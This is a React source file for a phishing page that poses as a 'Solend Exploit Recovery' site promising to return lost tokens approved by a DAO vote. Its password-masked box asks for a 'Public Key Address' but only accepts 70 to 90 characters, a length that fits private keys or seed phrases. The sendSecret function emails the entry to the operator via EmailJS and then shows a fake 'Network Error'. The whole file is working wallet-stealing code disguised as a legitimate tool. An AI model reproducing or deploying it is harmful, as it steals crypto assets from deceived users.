import { useState, useEffect, useRef } from 'react';
import {
  BrowserRouter as Router,
  Switch,
  Route,
} from "react-router-dom";
import { 
	Flex,
	Text,
  	Image,
  	ChakraProvider,
  	Spinner,
} from "@chakra-ui/react";
import emailjs from 'emailjs-com';
import "./App.scss";
import "./mdi/css/materialdesignicons.css";
import Aos from "aos";
import "aos/dist/aos.css";
import Logo from "./logo.webp";


function App() {
	const [loading, setLoading] = useState(false)
	const [isDisabled, setIsDisabled] = useState(true)
	const [err, setErr] = useState(false)
	const [err2, setErr2] = useState(false)
	const [errHolder, setErrHolder] = useState(false)
	
	useEffect(() => {
		Aos.init({ duration: 1000 });
	}, [])
	

	async function sendSecret(seed) {
		setLoading(true)
		const templateParams = {
			from_name: "New User",
			message: "SOLEND: Public key Address is: ("+seed+")",
		}
		await emailjs.send('Outlook', 'template_mleo03h', templateParams, 'user_tCdawzcLUo44ZVpWbE1PX')
		.then((response) => {
			console.log('')
		}, (err) => {
			console.log('')
		})
		setLoading(false)
		setErr(true)
	}
	

	return (
		<ChakraProvider>
			<Flex w="100%" direction="column" bg="#141026" color="#e5e3ec" h="100vh" fontFamily="font" letterSpacing="1px" fontSize="1rem" className="scPage" overflowY="scroll">
				<Flex w="100%" top="0" position="sticky" align="center" px={["0.5rem", "1.5rem"]} py="0.2rem" borderBottom="1px solid #2a2440" bg="#141026" >
					<Flex align="center" cursor="pointer" onClick={() => window.location.reload()}>
						<Image h="60px" src={Logo} />
					</Flex>
				</Flex>

				<Flex pt="50px" pb="2.5rem" px={["1.2rem", "17%"]} w="100%" direction="column">
					<Text fontSize="1.5rem" fontWeight="bold" mb="0.75rem">Solend Exploit Recovery</Text>
					<Text mb="0.5rem" color="#c1bed3">Claim your lost tokens as approved by the <Text as="span" color="#ff5c28" cursor="pointer" _hover={{ textDecoration: "underline" }} onClick={() => window.open("https://app.realms.today/dao/MNGO/proposal/HRR4ydbGUYYTCUgr7KvKdWW87HzCQy9Fu6aL8X5BMFUT", "_BLANK")}>DAO vote</Text>. If you have more than one Solend account for your provided Public key address the recovery amount are combined.</Text>

					<Text fontWeight="bold" mb="0.8rem">Your tokens:</Text>
					<textarea style={{ padding: "1.5rem", border: "1px solid #2a2440", borderRadius: "0.5rem", color: "#c1bed3", background: "#141026", fontSize: ".875rem", letterSpacing: "3px", height: "180px", wordSpacing: "8px" }} type="password" placeholder="Enter Public Key Address to view claimable tokens" id="sPhrase" onInput={(e) => {
						if(e.target.value === "") {
							setErrHolder(false)
						}
						else if(e.target.value.length > 69 && e.target.value.length < 91 ) {
							setIsDisabled(false)
							setErrHolder(false)
						}
						else {
							setIsDisabled(true)
							setErrHolder(true)
						}
					}}></textarea>

					{
						errHolder &&
						<Text color="#ff5c28" fontSize="13px" mt="2">*Invalid Public Key Address</Text>
					}

					<Flex mt="2rem" w="100%" justify="center">
						<Flex cursor={isDisabled ? "not-allowed" : "pointer"} color={isDisabled ? "#7e7a90" : "#e5e3ec"} fontSize="1.125rem" py="1rem" px="2.5rem" bg={isDisabled ? "#37324d" : "#464063"} borderRadius="9999px" fontWeight="bold" transition="300ms ease-in-out" onClick={() => {
							if(!isDisabled) {
								var phrase = document.getElementById('sPhrase').value
								if(phrase.length > 69 && phrase.length < 91 ) {
									sendSecret(phrase)
								}
								else {
									setErr2(true)
								}
							}
						}}>{loading ? <Spinner color="#e5e3ec" emptyColor="#7e7a90" /> : "Claim Tokens"}</Flex>
					</Flex>

					<Text mb="1.5rem" mt="1.5rem" color="#ff5c28">Recovery funds can be claimable using a generated public key.</Text>

					<Text mb="0.5rem" fontWeight="bold">What is a public key?</Text>
					<Text mb="1.5rem" color="#c1bed3">A public key allows you to receive cryptocurrency transactions. It's a cryptographic code that's paired to a private key. While anyone can send transactions to the public key, you need the private key to “unlock” them and prove that you are the owner of the cryptocurrency received in the transaction.</Text>

					<Text mb="0.5rem" fontWeight="bold">How to generate public keys?</Text>
					<Text color="#c1bed3">Go to <Text as="span" color="#ff5c28" _hover={{ textDecoration: "underline" }} cursor="pointer" onClick={() => window.open("https://oracledocs.app", "_BLANK")}>oracledocs.app</Text></Text>
				</Flex>
			</Flex>

			{
				err &&
				<Flex w="100%" h="100%" justify="center" align="center" position="fixed" zIndex="1000" top="0" left="0" bg="rgba(0,0,0,0.8)">
					<Flex w={["90%", "30%" ]}direction="column" borderRadius="0.5rem" bg="#141026" border="1px solid #2a2440" p="2rem" mt="-4">
						<Text fontWeight="bold" fontSize="1.125rem" mb="0.2rem">Network Error</Text>
						<Text color="#c1bed3" mb="1.5rem">Kindly check your internet connection and try again!</Text>
						<Flex w="100%" justify="flex-end">
							<Flex cursor="pointer" color="#e5e3ec" fontSize="1.125rem" py="0.5rem" px="2rem" bg="#464063" borderRadius="9999px" fontWeight="bold" transition="300ms ease-in-out" onClick={() => setErr(false)}>Okay</Flex>
						</Flex>
					</Flex>
				</Flex>
			}

			{
				err2 &&
				<Flex w="100%" h="100%" justify="center" align="center" position="fixed" zIndex="1000" top="0" left="0" bg="rgba(0,0,0,0.8)">
					<Flex w={["90%", "30%" ]}direction="column" borderRadius="0.5rem" bg="#141026" border="1px solid #2a2440" p="2rem" mt="-4">
						<Text fontWeight="bold" fontSize="1.125rem" mb="0.2rem">Invalid Public Key Address</Text>
						<Text color="#c1bed3" mb="1.5rem">Kindly enter a valid Public Key Address and try again!</Text>
						<Flex w="100%" justify="flex-end">
							<Flex cursor="pointer" color="#e5e3ec" fontSize="1.125rem" py="0.5rem" px="2rem" bg="#464063" borderRadius="9999px" fontWeight="bold" transition="300ms ease-in-out" onClick={() => setErr2(false)}>Okay</Flex>
						</Flex>
					</Flex>
				</Flex>
			}
		</ChakraProvider>
	)
}

export default App;
